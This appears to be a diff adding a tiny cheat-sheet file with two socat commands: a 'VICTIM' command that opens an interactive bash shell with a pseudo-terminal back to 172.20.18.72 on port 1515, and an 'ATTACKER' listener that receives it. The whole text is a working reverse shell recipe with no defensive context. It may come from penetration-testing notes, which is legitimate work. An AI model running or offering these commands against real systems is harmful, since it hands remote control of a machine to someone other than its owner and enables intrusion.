@@ -1,0 +1,5 @@
+VICTIM
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:172.20.18.72:1515
+
+ATTACKER
+socat file:`tty`,raw,echo=0 tcp-listen:1515
